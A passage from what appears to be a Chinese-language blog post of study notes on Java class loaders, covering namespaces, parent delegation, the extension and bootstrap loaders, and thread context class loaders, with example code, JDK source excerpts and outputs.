    public static void test(ClassLoader classLoader) throws ClassNotFoundException, IllegalAccessException, InstantiationException {
        Class&amp;lt;?&amp;gt; clazz = classLoader.loadClass(&quot;com.erwa.jvm.MyTest1&quot;);
        //创建类的实例
        Object object = clazz.newInstance();
        System.out.println(object);
    }

    public static void main(String[] args) throws IllegalAccessException, InstantiationException, ClassNotFoundException {
        MyTest16 loader1 = new MyTest16(&quot;loader1&quot;);
        test(loader1);
    }
}

&amp;gt; 输出结果： 
&amp;gt; Task :MyTest16.main()
com.erwa.jvm.MyTest1@6d06d69c
  
  定义的第一个自定义的类加载器结束。&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;类加载器重要方法详解&quot;&gt;类加载器重要方法详解&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;启动类加载器&lt;/p&gt;
&lt;p&gt;扩展类加载器&lt;/p&gt;
&lt;p&gt;应用类加载器&lt;/p&gt;
&lt;p&gt;自定义类加载器&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;拒绝低效率的学习&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;通过defineClass，将byte转换成Class的对象。
protected final Class&amp;lt;?&amp;gt; defineClass(String name, byte[] b, int off, int len){}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbq5stpfl0j317u0rsdl0.jpg&quot; alt=&quot;image-20200209150126348&quot;/&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbq4p74lbnj319a0k0aug.jpg&quot; alt=&quot;image-20200209142333383&quot;/&gt;案例结果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbq4s5o3fnj31di0cwqis.jpg&quot; alt=&quot;image-20200209142624312&quot;/&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;类加载器的命名空间&quot;&gt;类加载器的命名空间&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbtxj37yflj31fx0u0qv5.jpg&quot; alt=&quot;image-20200212211744291&quot;/&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;每个类加载器都有 自己的命名空间，命名空间由该加载器及所有父加载器所加载的类组成
&lt;ul&gt;&lt;li&gt;子加载器所加载的类能够访问父加载器所加载的类&lt;/li&gt;
&lt;li&gt;父加载器加载的类无法访问子加载器所加载的类&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;在同一个命名空间中，不会出现类的完整名字（包括类的包名）相同的两个类&lt;/li&gt;
&lt;li&gt;在不同的命名空间中，有可能会出现类的完整名字（包括类的包名）相同的两个类&lt;/li&gt;
&lt;/ul&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbq4z17nhcj31ky0u0u0x.jpg&quot; alt=&quot;image-20200209143258500&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;输出结果一样，说明loader1 和loader2成为了父子关系，在同一命名空间中。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbq5b6hperj31mo0u01ky.jpg&quot; alt=&quot;image-20200209144439558&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbq5c3ua9oj31gu0u01ky.jpg&quot; alt=&quot;image-20200209144532735&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;不同类加载器的命名空间关系&quot;&gt;不同类加载器的命名空间关系&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbtqygp82xj31320lugwd.jpg&quot; alt=&quot;image-20200212173018051&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;类的卸载&quot;&gt;类的卸载&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbq5fh0ntkj31620se7wh.jpg&quot; alt=&quot;image-20200209144847859&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbq5g0s03jj317g0h0tm5.jpg&quot; alt=&quot;image-20200209144920023&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbq5h8lvk2j31400b2ajl.jpg&quot; alt=&quot;image-20200209145030174&quot;/&gt;&lt;/p&gt;
&lt;p&gt;类的卸载举例：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbq5kgybuij31qy0u0qv5.jpg&quot; alt=&quot;image-20200209145335522&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbq5mimb4uj31ny0u0u0x.jpg&quot; alt=&quot;image-20200209145532976&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;也可以通过一个小工具，来查看 jvisualvm&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbq5pn3obnj31bl0u0e81.jpg&quot; alt=&quot;image-20200209145833650&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;自定义类加载器在复杂类加载情况下的运行分析&quot;&gt;自定义类加载器在复杂类加载情况下的运行分析&lt;/h4&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class MyCat{
    public MyCat(){
        System.out.println(&quot;MyCat is loaded by : &quot;+ this.getClass().getClassLoader());
    }
}

public class MySample{
    public MySample(){
        System.out.println(&quot;MySample is loaded by : &quot;+ this.getClass().getClassLoader());
        new MyCat();
    }
}

public class MyTest17{
    public static void main(String[] args) throws Exception{
        MyTest16 loader1 = new MyTest16(&quot;loader1&quot;);
        Class&amp;lt;?&amp;gt; clazz = loader1.loadClass(&quot;com.erwa.jvm.MySample&quot;);
        System.out.println(clazz.hashCode());
      
      // 如果注释掉该行，那么并不会实例化MySample对象，即MySample构造方法不会被调用
      //因此不会实例化MyCat对象，即没有对MyCat进行主动使用。这里就不会加载MyCat的CLass
        Object object = clazz.newInstance();
    }
}

&amp;gt; 输出结果
&amp;gt; Task :MyTest17.main()
2018699554
MySample is loaded by : sun.misc.Launcher$AppClassLoader@659e0bfd
MyCat is loaded by : sun.misc.Launcher$AppClassLoader@659e0bfd
  
这个例子有多种情况，结果是不同的。
ClassPath 中删除 MySample
ClassPath 中删除 MyCat
ClassPath 中删除 MyCat  MySample  

》 总体来说，就是命名空间的概念。
- 子加载器所加载的类能够访问父加载器所加载的类
- 父加载器加载的类无法访问子加载器所加载的类&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;2020年02月10日21:36:38&lt;/p&gt;
&lt;h4 id=&quot;对于类加载器具体是从哪个地方加载的&quot;&gt;对于类加载器，具体是从哪个地方加载的？&lt;/h4&gt;
&lt;blockquote readability=&quot;11&quot;&gt;
&lt;p&gt;系统类加载器:sun.boot.class.path （加载系统的包，包含jdk核心库里的类）&lt;/p&gt;
&lt;p&gt;扩展类加载器:java.ext.dirs（加载扩展jar包中的类）&lt;/p&gt;
&lt;p&gt;应用类加载器:java.class.path（加载你编写的类，编译后的类）&lt;/p&gt;
&lt;p&gt;​ 可以打印出各个加载器加载的目录: System.getProperty(&quot;上述的地址&quot;);&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class MyPerson{
  private MyPerson myperson;
  public void setMyPerson(Object object){
    this.myperson = (MyPerson) object
  }
}

public class MyTest20{
  psvm{
    MyTest16 loader1 = new MyTest16(&quot;loader1&quot;);
    MyTest16 loader2 = new MyTest16(&quot;loader2&quot;);
    
    Class&amp;lt;?&amp;gt; clazz1 = loader1.loadClass(&quot;com.erwa.jvm.MyPerson&quot;);//系统类加载器加载MyPerson的类
    Class&amp;lt;?&amp;gt; clazz2 = loader2.loadClass(&quot;com.erwa.jvm.MyPerson&quot;);//系统类加载器已经加载过此类。就不会再次加载，直接返回之前加载过的对象。 所以下方的结果为true.

    sout(clazz1 == clazz2);//结果为true 
    //原因是： loader1的父亲为系统类加载，系统类加载器可以加载MyPerson的类。 到了loader2时，加载时，系统类加载器已经加载过此类。就不会再次加载，直接返回之前加载过的对象。 所以结果为true.
    //并不是因为 loader1 和loader2 是由MyTest16类生成的同样的实例。
    
    Object object1 = clazz1.newInstance();
    Object object2 = clazz2.newInstance();

    //发射，取到MyPerson中的set方法
    Method methos = clazz1.getMethod(&quot;setMyPerson&quot;,Object.class);
    method.invoke(object1,object2);// 这个地方可以正常运行
  }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;// 命名空间深度剖析
//命名空间，由该加载器及所有父加载器加载的类组成
public class MyTest20{
  psvm{
    MyTest16 loader1 = new MyTest16(&quot;loader1&quot;);
    MyTest16 loader2 = new MyTest16(&quot;loader2&quot;);
    
    loader1.setPath(&quot;user/erwa/Desktop/&quot;);
    loader2.setPath(&quot;user/erwa/Desktop/&quot;);
    //然后把编译生成的class文件剪贴到桌面上。此时，执行此类的输出结果是什么？
    
   Class&amp;lt;?&amp;gt; clazz1 = loader1.loadClass(&quot;com.erwa.jvm.MyPerson&quot;);//自定义加载器1加载MyPerson的类
   Class&amp;lt;?&amp;gt; clazz2 = loader2.loadClass(&quot;com.erwa.jvm.MyPerson&quot;);//自定义加载器2加载MyPerson的类
    // clazz1 和clazz2加载的文件不在同一个命名空间中。
    
    sout(clazz1 == clazz2);//结果为false
    //原因是： loader1的父亲为系统类加载，系统类加载器不能加载MyPerson的类，由自定义加载器加载。 到了loader2时，加载时同loader1，由自定义加载器的实例再次加载，直接返回之前加载过的对象。 所以结果为true.
    //并不是因为 loader1 和loader2 是由MyTest16类生成的同样的实例。
    
    Object object1 = clazz1.newInstance();
    Object object2 = clazz2.newInstance();

    //发射，取到MyPerson中的set方法
    Method methos = clazz1.getMethod(&quot;setMyPerson&quot;,Object.class);
    method.invoke(object1,object2);  //并且这个地方抛异常
  }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbrod7tp1ij328w0iab29.jpg&quot; alt=&quot;image-20200210222934649&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbro9twb2hj31bc0r07it.jpg&quot; alt=&quot;image-20200210222615920&quot;/&gt;&lt;/p&gt;
&lt;h4 id=&quot;类加载器命名空间总结&quot;&gt;类加载器命名空间总结&lt;/h4&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;类加载器的双亲委托模型的好处：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;可以确保Java核心库的类型安全：(jdk自带的rt.jar等)所有的Java应用都至少会引用Java.lang.Object类，也就是说，在运行期，这个类会被加载器到Java虚拟机中；如果这个加载过程是由Java应用自己提供的类加载器完成的，那么就很可能在jvm中存在多个Java.lang.Object类的版本，而且这些类之间还是不兼容的，相互不可见的（正是命名空间在发挥着作用）。借助于双亲委托机制，Java核心类库中的类的加载工作都是由启动类（根类）加载器来统一完成。从而确保了Java应用使用的都是同一个版本的Java核心类库，他们之间是相互兼容的。&lt;/li&gt;
&lt;li&gt;可以确保Java核心类库所提供的类，不会被自定义的类所替代。&lt;/li&gt;
&lt;li&gt;不同的类加载器可以被相同名称（binary name）的类创建额外的命名空间；相同名称的类可以并存在Java虚拟机中，只需要用不同的类加载器加载他们即可。不同类加载器所加载的类之间是不兼容的，这就相当于在Java虚拟机中创建了一个又一个相互隔离的Java类空间，这类技术在多框架中都得到了实际应用。&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;
&lt;h4 id=&quot;扩展类加载器类特性介绍&quot;&gt;扩展类加载器类特性介绍&lt;/h4&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;public class MyTest22{
  static{
    sout(&quot;MyTest22 initializer&quot;);
  }
  
  psvm{
    sout(MyTest22.class.getClassLoader());
    sout(MyTest1.class.getClassLoader());
  }
}
&amp;gt; 1.此时的输出结果是什么？
  AppClassLoader
  AppClassLoader

&amp;gt; 2.修改本地的扩展类加载器的加载路径。
  1. 进入到当前编译的 out路径
  2. java -Djava.ext.dirs=./ com.erwa.jvm.MyTest22
  
&amp;gt; 3.此时的输出结果是什么？
  AppClassLoader
  AppClassLoader
 
4.还是一样的，为什么不是扩赞类加载器加载的呢？因为扩展类加载的类还不能是Class文件的形式，要以jar包的形式加载。
  
&amp;gt; 5.将当前的com打成jar包 
  jar cvf com.erwa.jvm
  
&amp;gt; 6.此时的输出结果是什么？
  AppClassLoader
  ExtClassLoader

&amp;gt; 7.  java -Djava.ext.dirs=/ com.erwa.jvm.MyTest22
 
&amp;gt; 8.此时的输出结果是什么？
  AppClassLoader
  AppClassLoader&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;12&quot;&gt;
&lt;p&gt;关于命名空间的补充：&lt;/p&gt;
&lt;p&gt;在运行期，一个Java类是由该类的完全限定名（binary name，二进制名）和用于加载该类的定义类加载器共同确定的。&lt;/p&gt;
&lt;p&gt;如果同样的名字（即相同的完全限定名）的类是由两个不同的加载器所加载，那么这些类就是不同的。即便.class文件的字节码完全一样，并且从相同的位置加载亦如此。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;在Oracle的Hotspot实现中，系统属性sun.boot.class.path如果修改错了，则运行时会出错，信息下图：&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbs19brtm5j317c038gqj.jpg&quot; alt=&quot;image-20200211055535115&quot;/&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;类加载器的特例，数组。数组不是由类加载器的加载的，是由JVM加载的。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;先有鸡还是先有蛋&quot;&gt;先有鸡还是先有蛋？&lt;/h3&gt;
&lt;p&gt;类加载器本身也是一个Java类，他们是怎么加载到JVM当中的呢？&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;他们是由启动类加载器加载的。BootStrapClassLoader加载的。他不是由Java代码写的，由C++代码编写的。启动的时候回自动加载出启动类加载器的实例。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ol readability=&quot;0&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;内建与JVM中的启动类加载器会加载java.lang.ClassLoader以及其他的Java类加载器。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;当JVM启动时，一块特殊的机器码会执行，它会加载类加载器与系统类加载器，这块特殊的机器码叫做启动类加载器（BootStarp）&lt;/li&gt;
&lt;li&gt;启动类加载器并不是Java类，而其他的加载器则都是Java类&lt;/li&gt;
&lt;li&gt;启动类加载器是特定于平台的机器指令，它负责开启整个加载过程&lt;/li&gt;
&lt;li&gt;所有类加载器（除了启动类加载器）都被时限为Java类。不过，中国要有一个组件来加载第一个Java类加载器，从而让整个过程能够顺利的进行下去，加载第一个纯Java类加载器就是启动类加载器的职责。&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;启动类加载器还会负责加载供JRE正常运行所需要的基本组件，这包括java.util与java.lang包中的内容。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;sout(ClassLoader.class.getClassLoader());
&amp;gt; 输出结果：
  null    // 因为ClassLoader是由启动类加载器的加载的。
  
ExtClassLoader 和 APPCLassLoader 位于 Launcher.class中的静态内部类。

sout(Launcher.class.getClassLoader());
&amp;gt; 输出结果：
  null    // 因为扩展类加载器与应用类加载器也是由启动类加载器的加载的。&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;自定义系统类加载器&quot;&gt;自定义系统类加载器&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbs1sozik0j31ue0d4qtn.jpg&quot; alt=&quot;image-20200211061413889&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbs1tmpke1j30sa03umzd.jpg&quot; alt=&quot;image-20200211061508983&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbs1sbnb4ij31uc01i0wx.jpg&quot; alt=&quot;image-20200211061353721&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在自定义类加载器中加一个父类的构造方法，就可以正常的运行了。&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;用Java命令行的话，和idea里边执行的结果有时候类加载器的是不一样的。&lt;/p&gt;
&lt;p&gt;因为idea也重新定义了类加载器的路径。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h5 id=&quot;getsystemclassloader&quot;&gt;getSystemClassLoader()；&lt;/h5&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;java.lang.ClassLoader public static ClassLoader getSystemClassLoader()
Returns the system class loader for delegation. This is the default delegation parent for new ClassLoader instances, and is typically the class loader used to start the application.
 // 通常 系统类加载器用来加载我们的应用。
This method is first invoked early in the runtimes startup sequence, at which point it creates the system class loader and sets it as the context class loader of the invoking Thread.
// 这个方法会创建系统类加载器，并将AppClassLoader设置为上下文类加载器
The default system class loader is an implementation-dependent instance of this class.
  
If the system property &quot;java.system.class.loader&quot; is defined when this method is first invoked then the value of that property is taken to be the name of a class that will be returned as the system class loader. The class is loaded using the default system class loader and must define a public constructor that takes a single parameter of type ClassLoader which is used as the delegation parent. An instance is then created using this constructor with the default system class loader as the parameter. The resulting class loader is defined to be the system class loader.
  // 如果我们自定义了 java.system.class.loader。 那么就会把这个值当做系统类加载器。这个类是被AppClassLoader加载器加载器的。这个自定义的系统类加载器必须要有一个 带有父加载器参数的构造方法。
If a security manager is present, and the invoker's class loader is not null and the invoker's class loader is not the same as or an ancestor of the system class loader, then this method invokes the security managers checkPermission method with a RuntimePermission(&quot;getClassLoader&quot;) permission to verify access to the system class loader. If not, a SecurityException will be thrown.

   @CallerSensitive
    public static ClassLoader getSystemClassLoader() {
        initSystemClassLoader();
        if (scl == null) {
            return null;
        }
        SecurityManager sm = System.getSecurityManager();
        if (sm != null) {
            checkClassLoaderPermission(scl, Reflection.getCallerClass());
        }
        return scl;
    }

    private static synchronized void initSystemClassLoader() {
        if (!sclSet) {
            if (scl != null)
                throw new IllegalStateException(&quot;recursive invocation&quot;);
            sun.misc.Launcher l = sun.misc.Launcher.getLauncher(); // 这个地方值得深入理解一下
            if (l != null) {
                Throwable oops = null;
                scl = l.getClassLoader(); // 返回了AppClassLoader
                try {
                  // 已经获取到了 scl 为什么还要进行一步这样的操作呢？
                  // 加载自定义系统类加载器的属性。如果自定义了系统类加载器，在这里进行了处理，如果没有的话，则使用默认的系统类加载器。（可以点进去看看，里边的run方法摘抄出来放下了下方）
                    scl = AccessController.doPrivileged(
                        new SystemClassLoaderAction(scl));
                } catch (PrivilegedActionException pae) {
                    oops = pae.getCause();
                    if (oops instanceof InvocationTargetException) {
                        oops = oops.getCause();
                    }
                }
                if (oops != null) {
                    if (oops instanceof Error) {
                        throw (Error) oops;
                    } else {
                        // wrap the exception
                        throw new Error(oops);
                    }
                }
            }
            sclSet = true;  //设置成功了
        }
    }

// 处理自定义加载器的方法。
 public ClassLoader run() throws Exception {
        String cls = System.getProperty(&quot;java.system.class.loader&quot;);
        if (cls == null) {// 如果设置了自定义加载器的属性，则不为null，进行后续的操作。
            return parent;
        }

   // 在下方，会单独讲解一下 Class.forName方法的使用。
        Constructor&amp;lt;?&amp;gt; ctor = Class.forName(cls, true, parent)
            .getDeclaredConstructor(new Class&amp;lt;?&amp;gt;[] { ClassLoader.class });
        ClassLoader sys = (ClassLoader) ctor.newInstance( //获取到自定义的类加载器。返回
            new Object[] { parent });
        Thread.currentThread().setContextClassLoader(sys);
        return sys;
    }&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;grepcode.com 在线查看源代码的网站。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;为什么扩展类加载的路径是java.ext.dirs 源代码里边写的。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tva1.sinaimg.cn/large/0082zybply1gbs2htuqo6j316y0gedpz.jpg&quot; alt=&quot;image-20200211063824377&quot;/&gt;&lt;/p&gt;
&lt;h5 id=&quot;launcher&quot;&gt;Launcher()；&lt;/h5&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;//双亲处理的机制。精髓
public Launcher() {
        // Create the extension class loader  创建扩展类加载器
        ClassLoader extcl;
        try {
            extcl = ExtClassLoader.getExtClassLoader();
        } catch (IOException e) {
            throw new InternalError(
                &quot;Could not create extension class loader&quot;, e);
        }

        // Now create the class loader to use to launch the application 创建应用类加载器
        try {
            loader = AppClassLoader.getAppClassLoader(extcl);
        } catch (IOException e) {
            throw new InternalError(
                &quot;Could not create application class loader&quot;, e);
        }

        // Also set the context class loader for the primordial thread.
  // 为当前的执行线程设置上下文类加载器。（重要。重要。重要。）
 // 如果没有通过setContextCLassLoader(ClassLoader cl)进行设置的话，线程将继承其父线程的上下文类加载器。Java应用运行时的初始线程的上下文类加载器是系统类加载器
        Thread.currentThread().setContextClassLoader(loader);

        // Finally, install a security manager if requested
        String s = System.getProperty(&quot;java.security.manager&quot;);
        if (s != null) {
            // init FileSystem machinery before SecurityManager installation
            sun.nio.fs.DefaultFileSystemProvider.create();

            SecurityManager sm = null;
            if (&quot;&quot;.equals(s) || &quot;default&quot;.equals(s)) {
                sm = new java.lang.SecurityManager();
            } else {
                try {
                    sm = (SecurityManager)loader.loadClass(s).newInstance();
                } catch (IllegalAccessException e) {
                } catch (InstantiationException e) {
                } catch (ClassNotFoundException e) {
                } catch (ClassCastException e) {
                }
            }
            if (sm != null) {
                System.setSecurityManager(sm);
            } else {
                throw new InternalError(
                    &quot;Could not create SecurityManager: &quot; + s);
            }
        }
    }&lt;/code&gt;
&lt;/pre&gt;
&lt;h5 id=&quot;class.forname&quot;&gt;Class.forName();&lt;/h5&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;第一次使用这个方法的时候，是在学习JDBC的时候获取数据库连接。那个时候只用到了一个参数的构造方法&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;java.lang.Class&amp;lt;T&amp;gt; public static Class&amp;lt;?&amp;gt; forName(@NonNls String name,
                               boolean initialize,
                               ClassLoader loader)  throws ClassNotFoundException
Returns the Class object associated with the class or interface with the given string name, using the given class loader. Given the fully qualified name for a class or interface (in the same format returned by getName) this method attempts to locate, load, and link the class or interface. The specified class loader is used to load the class or interface. If the parameter loader is null, the class is loaded through the bootstrap class loader. The class is initialized only if the initialize parameter is true and if it has not been initialized earlier.
//使用给定的类加载器返回与具有给定字符串名称的类或接口关联的Class对象。 给定类或接口的完全限定名称（采用getName返回的相同格式），此方法尝试查找，加载和链接该类或接口。 指定的类加载器用于加载类或接口。 如果参数加载器为null，则通过引导类加载器加载该类。 仅当initialize参数为true且之前尚未初始化时，才对类进行初始化。
If name denotes a primitive type or void, an attempt will be made to locate a user-defined class in the unnamed package whose name is name. Therefore, this method cannot be used to obtain any of the Class objects representing primitive types or void.
If name denotes an array class, the component type of the array class is loaded but not initialized.
//如果name表示原始类型或void，则将尝试在名称为name的未命名包中定位用户定义的类。 因此，该方法不能用于获取表示原始类型或void的任何Class对象。如果name表示数组类，则将加载但不初始化该数组类的组件类型。
For example, in an instance method the expression:
Class.forName(&quot;Foo&quot;)
is equivalent to:
Class.forName(&quot;Foo&quot;, true, this.getClass().getClassLoader())
Note that this method throws errors related to loading, linking or initializing as specified in Sections 12.2, 12.3 and 12.4 of The Java Language Specification. Note that this method does not check whether the requested class is accessible to its caller.
If the loader is null, and a security manager is present, and the caller's class loader is not null, then this method calls the security manager's checkPermission method with a RuntimePermission(&quot;getClassLoader&quot;) permission to ensure it's ok to access the bootstrap class loader.
/*例如，在实例方法中，表达式为：
Class.forName（“ Foo”）
等效于：
Class.forName（“ Foo”，yes，this.getClass（）.getClassLoader（））
请注意，此方法会引发与Java语言规范的12.2、12.3和12.4节中指定的加载，链接或初始化有关的错误。 请注意，此方法不检查其调用者是否可以访问所请求的类。
如果加载程序为null，并且存在安全管理器，并且调用方的类加载器不为null，则此方法使用RuntimePermission（“ getClassLoader”）权限调用安全管理器的checkPermission方法，以确保可以访问引导程序类加载器 。*/
Params:
name – fully qualified name of the desired class
initialize – if true the class will be initialized. See Section 12.4 of The Java Language Specification.
loader – class loader from which the class must be loaded
/*参数：
名称-所需类别的完全限定名称
初始化–如果为true，则将初始化该类。 参见Java语言规范的12.4节。
loader –必须从中加载类的类加载器*/
  @CallerSensitive
    public static Class&amp;lt;?&amp;gt; forName(String name, boolean initialize,
                                   ClassLoader loader)
        throws ClassNotFoundException
    {
        Class&amp;lt;?&amp;gt; caller = null;
        SecurityManager sm = System.getSecurityManager();
        if (sm != null) {
            // Reflective call to get caller class is only needed if a security manager
            // is present.  Avoid the overhead of making this call otherwise.
            caller = Reflection.getCallerClass();
            if (sun.misc.VM.isSystemDomainLoader(loader)) {
                ClassLoader ccl = ClassLoader.getClassLoader(caller);
                if (!sun.misc.VM.isSystemDomainLoader(ccl)) {
                    sm.checkPermission(
                        SecurityConstants.GET_CLASSLOADER_PERMISSION);
                }
            }
        }
        return forName0(name, initialize, loader, caller);
    }
  
  
     @CallerSensitive
    public static Class&amp;lt;?&amp;gt; forName(String className)
                throws ClassNotFoundException {
        Class&amp;lt;?&amp;gt; caller = Reflection.getCallerClass();
        return forName0(className, true, ClassLoader.getClassLoader(caller), caller);
    }&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;线程上下文类加载器&quot;&gt;线程上下文类加载器&lt;/h3&gt;
&lt;blockquote readability=&quot;12&quot;&gt;
&lt;p&gt;当前类加载器（Current ClassLadert）:加载当前类的加载器。&lt;/p&gt;
&lt;p&gt;每一个类都会尝试使用自身的类加载器（即加载自身的类加载器）来加载其他的类（指的是所依赖的类）。&lt;/p&gt;
&lt;p&gt;如： 如果CLassx引用了ClassY,那么ClassX的类加载器就会去加载CLassY（前提是ClassY尚未被加载）&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;12&quot;&gt;
&lt;p&gt;&lt;strong&gt;线程上下文类加载器（Context CLassloader）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;线程上下文类加载器是从jdk1.2开始引入的，类Thread中的getContextClassLoader();与setContextClassLoadert();分别用来获取和设置上下文类加载器。&lt;/p&gt;
&lt;p&gt;如果没有通过setContextCLassLoader(ClassLoader cl)进行设置的话，线程将继承其父线程的上下文类加载器。Java应用运行时的初始线程的上下文类加载器是系统类加载器。在线程中运行的代码可以通过该类加载器来加载类与资源。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote readability=&quot;18&quot;&gt;
&lt;p&gt;线程上下文类加载器的重要性：&lt;/p&gt;
&lt;p&gt;SPI（Service Proider Interface） 服务提供厂商；&lt;/p&gt;
&lt;p&gt;父ClassLoader可以使用当前线程Thread.currentThread().getContextClassLoader()所指定的ClassLoader加载的类，这就改变了父ClassLoader不能使用子ClassLoader或者是其他没有直接父子关系的ClassLoader加载的类的情况，即这就改变了双亲委托模型。&lt;/p&gt;
&lt;p&gt;线程上下文类加载器就是当前线程的Current ClassLoader。&lt;/p&gt;
&lt;p&gt;在双亲委托模型下，类加载是由下至上的，即下层的类加载器会委托上层进行加载。但是对于SPI来说，有些类是由Java核心库提供的。而Java核心库是由启动类加载器来加载的，而这些接口的实现却来源于不同的jar包（不同的厂商提供），Java的启动类加载器是不会加载其他来源的jar包，这样传统的双亲委托模型就无法满足SPI的要求，而通过给当前线程设置上下文类加载器，就可以由上下文类加载器来实现对于接口实现类的加载。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;Thread.currentThread().setContextClassLoader(loader);

public class MyTest24{
  psvm{
    sout(Thread.currentThread().getContextClassLoader());
    sout(Thread.class.getClassLoader());
  }
}

输出结果：
  AppClassLoader
  null 
  &lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;数据库厂商肯定会满足jdbc规范的接口。&lt;/p&gt;
&lt;p&gt;Tomcat和spring的类加载机制和jdk的不同。&lt;/p&gt;
&lt;pre class=&quot;java&quot;&gt;
&lt;code&gt;/**
如果没有通过setContextCLassLoader(ClassLoader cl)进行设置的话，线程将继承其父线程的上下文类加载器。Java应用运行时的初始线程的上下文类加载器是系统类加载器。在线程中运行的代码可以通过该类加载器来加载类与资源。
**/
public class MyTest25 implements Runnable {
    private Thread thread;

    public MyTest25() {
        thread = new Thread(this);
        thread.start();
    }

    @Override
    public void run() {
        ClassLoader classLoader = this.thread.getContextClassLoader();
        this.thread.setContextClassLoader(classLoader);
        System.out.println(&quot;class:&quot;+ classLoader.getClass());
